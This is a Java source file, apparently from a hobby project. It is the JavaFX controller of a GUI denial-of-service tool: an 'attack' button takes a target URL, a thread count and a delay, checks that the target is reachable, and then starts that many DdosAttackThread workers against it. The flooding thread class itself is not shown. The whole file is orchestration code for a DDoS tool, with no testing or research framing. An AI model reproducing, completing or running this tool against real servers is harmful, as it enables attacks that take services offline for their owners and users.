package sample;

import javafx.application.Platform;
import javafx.beans.property.BooleanProperty;
import javafx.beans.property.SimpleBooleanProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ListView;
import javafx.scene.control.TextField;
import javafx.scene.text.Text;

import java.io.IOException;
import java.net.*;
import java.util.HashSet;
import java.util.Set;

public class ButtonController {

    @FXML
    public Button attack;
    @FXML
    public Button exit;

    @FXML
    public Text urlErr;

    @FXML
    public Text threadErr;

    @FXML
    public Text delayErr;

    @FXML
    private TextField url;

    @FXML
    private  TextField threads;

    @FXML
    private  TextField delay;

    @FXML
    private Label serverStatus;

    @FXML
    public ListView<Label> log_list;
    public static boolean isServerRunning = false;
    public ObservableList<Label> logs = FXCollections.observableArrayList();
    public BooleanProperty status = new SimpleBooleanProperty();

    public boolean checkServerAvailability(String host, int port) throws InterruptedException {
        boolean isAlive = false;
        try{
            Socket socket = new Socket();
            socket.connect(new InetSocketAddress(host, port),2000);
            Thread.sleep(2000);
            socket.close();
            isAlive = true;
        }catch (SocketTimeoutException e){
            System.out.println("Socket Timeout Exception");
        }catch (IOException e){
            System.out.println("IO Exception unable to connect");
            e.printStackTrace();
        }
        return isAlive;

    }

    public boolean isValidURL(String url) {
        try {
            new URL(url).toURI();
        } catch (MalformedURLException | URISyntaxException e) {
            return false;
        }
        return true;
    }

    @FXML
    public void initialize() throws InterruptedException {
        log_list.setItems(logs);
    }

    @FXML
    void Attack(ActionEvent event) throws Exception {
        isServerRunning = false;
        status.setValue(true);
        String urlText = url.getText();
        if(!isValidURL(urlText)){
            urlErr.setText("Please Enter a valid URL");
            return;
        }else{
            urlErr.setText("");
        }
        URL request = new URL(urlText);
        int num_threads = Integer.parseInt(threads.getText());
        if(num_threads <= 0){
            threadErr.setText("Error Please enter a valid number");
            return;
        }else{
            threadErr.setText("");
        }

        int delay_time = Integer.parseInt(delay.getText());
        if(delay_time<= 0){
            delayErr.setText("Error Please enter a valid delay time");
            return;
        }else{
            delayErr.setText("");
        }

        if(!checkServerAvailability(request.getHost(), request.getPort())){
            System.out.println("Nati awel");
            Platform.runLater(() -> {
                serverStatus.setText("Server is Unreachable");
            });
            return;
        }else{
            System.out.println("Nati");
            Platform.runLater(() -> {
                serverStatus.setText("");
            });
        }

        Set<Thread> threadSet = new HashSet<>();

        for (int i = 0; i < num_threads; i++) {
            DdosAttackThread thread = new DdosAttackThread(request, delay_time, this    );
//            new Thread(thread).start();
            threadSet.add(new Thread(thread));
        }
        for(Thread thread: threadSet){
            thread.start();
        }
    }

    @FXML
    void Exit(ActionEvent event) throws InterruptedException {
        status.setValue(false);
        logs.clear();
        Thread.sleep(1000);
    }
}
